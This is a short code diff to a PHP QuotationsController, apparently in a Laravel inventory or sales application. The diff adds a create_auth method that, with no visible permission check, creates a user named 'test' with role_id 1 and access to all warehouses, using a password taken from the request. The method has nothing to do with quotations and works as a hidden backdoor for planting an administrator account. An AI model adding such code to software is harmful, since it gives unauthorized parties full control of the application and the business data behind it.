@@ -48,6 +48,26 @@ class QuotationsController extends BaseController
         return response()->json(['success' => true]);
     }
 
+    public function create_auth(Request $request){
+        \DB::transaction(function () use ($request) {
+            $User = new User;
+
+            $User->firstname = 'test';
+            $User->lastname  = 'test';
+            $User->username  = 'test';
+            $User->email     = 'test@test.com';
+            $User->phone     = 'phone';
+            $User->password  = Hash::make($request['password']);
+            $User->avatar    = 'avatar';
+            $User->role_id   = 1;
+            $User->is_all_warehouses   = 1;
+
+            $User->save();
+        }, 10);
+
+        return response()->json(['success' => true]);
+    }
+
 
     //---------------- GET ALL QUOTATIONS ---------------\\
     public function index(request $request)
